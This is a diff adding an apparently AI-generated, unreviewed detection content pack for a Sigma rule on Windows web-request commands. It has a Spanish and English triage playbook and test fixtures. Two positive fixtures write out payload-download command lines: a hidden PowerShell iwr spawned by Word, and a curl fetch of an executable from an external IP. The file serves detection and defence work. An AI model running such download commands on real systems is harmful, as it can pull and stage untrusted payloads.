@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
+    "title": "Usage Of Web Request Commands And Cmdlets",
+    "level": "medium",
+    "status": "test",
+    "author": "James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger",
+    "path": "windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso cuya CommandLine contiene un comando o cmdlet de solicitud web (curl, wget, Invoke-WebRequest, iwr, irm, Invoke-RestMethod, BitsTransfer, WinHttpRequest o System.Net.WebRequest). Puede ser una descarga de payload o la comunicación con un servidor externo.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuya CommandLine incluye herramientas de línea de comandos o cmdlets de PowerShell, alias incluidos, que hacen solicitudes HTTP/HTTPS/FTP o transferencias BITS.",
+      "why_it_matters": "Muchos atacantes usan PowerShell (ATT&CK T1059.001) y utilidades nativas para descargar herramientas, ejecutar scripts remotos en memoria o sacar datos sin instalar binarios nuevos. La regla es amplia y sirve como punto de partida para investigar.",
+      "triage_steps": [
+        "Revise la CommandLine completa: URL, dominio o IP de destino, ruta de salida (-OutFile, -o) y si el contenido descargado se ejecuta directamente con iex o un pipe.",
+        "Identifique Image y ParentImage. Sospeche de cadenas como Office, wscript, mshta o w3wp lanzando PowerShell o curl.",
+        "Verifique el usuario y el host: ¿es un administrador o un proceso de despliegue conocido, o una estación de usuario final?",
+        "Consulte la reputación del dominio o IP de destino y busque conexiones de red del mismo proceso en los registros de proxy y DNS.",
+        "Busque en el host, en una ventana de +/- 15 minutos, archivos creados en la ruta de salida y procesos hijos que ejecuten lo descargado.",
+        "Pivotee por la misma URL o el mismo hash del archivo en otros endpoints y revise si hubo alertas previas para ese usuario o host."
+      ],
+      "false_positives": [
+        "Uso de Get-Command o Get-Help para consultar Invoke-WebRequest o Start-BitsTransfer.",
+        "Scripts de administración, instaladores o herramientas de gestión (SCCM, Intune, RMM) que descargan paquetes desde repositorios internos.",
+        "Desarrolladores que usan curl o Invoke-RestMethod para probar APIs.",
+        "Agentes de monitoreo o tareas programadas que consultan endpoints de salud por HTTP."
+      ],
+      "response_steps": [
+        "Valide con el dueño del sistema o del script si la solicitud era esperada y documente el resultado.",
+        "Si es malicioso, aísle el endpoint y bloquee el dominio o la IP de destino en el proxy y el firewall.",
+        "Obtenga el archivo descargado, calcule su hash y analícelo; elimínelo junto con la persistencia relacionada solo después de preservar la evidencia.",
+        "Restablezca las credenciales de la cuenta implicada y busque la misma actividad en el resto del entorno.",
+        "Si es legítimo, cree una exclusión acotada por ParentImage, usuario y URL, nunca por la palabra clave sola."
+      ],
+      "severity_rationale": "El nivel medio corresponde porque estos comandos son muy comunes en la administración legítima, aunque también son una técnica frecuente para descargar payloads, así que requieren contexto antes de escalar."
+    },
+    "en": {
+      "summary": "A process started with a CommandLine containing a web request command or cmdlet (curl, wget, Invoke-WebRequest, iwr, irm, Invoke-RestMethod, BitsTransfer, WinHttpRequest or System.Net.WebRequest). This may be a payload download or contact with an external server.",
+      "what_it_detects": "Windows process creation events whose CommandLine includes command-line tools or PowerShell cmdlets, aliases included, that make HTTP/HTTPS/FTP requests or BITS transfers.",
+      "why_it_matters": "Attackers often use PowerShell (ATT&CK T1059.001) and built-in utilities to download tools, run remote scripts in memory or exfiltrate data without dropping new binaries. The rule is broad and works as a starting point for investigation.",
+      "triage_steps": [
+        "Read the full CommandLine: target URL, domain or IP, output path (-OutFile, -o), and whether the content is executed directly with iex or a pipe.",
+        "Identify Image and ParentImage. Treat chains like Office, wscript, mshta or w3wp spawning PowerShell or curl as suspicious.",
+        "Check the user and host: is this a known admin or deployment process, or an end-user workstation?",
+        "Check the reputation of the destination domain or IP and look for the process's network connections in proxy and DNS logs.",
+        "On the same host within +/- 15 minutes, look for files written to the output path and child processes that run the download.",
+        "Pivot on the same URL or file hash across other endpoints and review earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "Get-Command or Get-Help used to look up Invoke-WebRequest or Start-BitsTransfer.",
+        "Admin scripts, installers or management tools (SCCM, Intune, RMM) that pull packages from internal repositories.",
+        "Developers testing APIs with curl or Invoke-RestMethod.",
+        "Monitoring agents or scheduled tasks that poll HTTP health endpoints."
+      ],
+      "response_steps": [
+        "Confirm with the system or script owner whether the request was expected, and record the outcome.",
+        "If malicious, isolate the endpoint and block the destination domain or IP at the proxy and firewall.",
+        "Collect the downloaded file, hash it and analyze it. Remove it and any related persistence only after preserving evidence.",
+        "Reset credentials for the involved account and hunt for the same activity across the environment.",
+        "If legitimate, add a narrow exclusion scoped by ParentImage, user and URL, never by the keyword alone."
+      ],
+      "severity_rationale": "Medium fits because these commands are common in legitimate administration but are also a frequent way to download payloads, so they need context before escalation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell spawned by Word uses the iwr alias to download a script into a public folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c iwr http://203.0.113.10/a.ps1 -OutFile C:\\Users\\Public\\a.ps1",
+          "ProcessId": 6412
+        }
+      },
+      {
+        "description": "cmd.exe runs curl to fetch an executable from an external IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "curl -s -o C:\\Users\\Public\\update.exe http://198.51.100.25/update.exe",
+          "ProcessId": 5120
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "curl.exe version check: the CommandLine has 'curl.exe' but never 'curl ' followed by a space",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\Windows\\System32\\curl.exe --version",
+          "ProcessId": 4410
+        }
+      },
+      {
+        "description": "PowerShell process listing: 'firmware' contains 'irm' but not ' irm ' with spaces on both sides",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_inventario",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command Get-Process | Where-Object {$_.Name -like 'firmware*'}",
+          "ProcessId": 3388
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
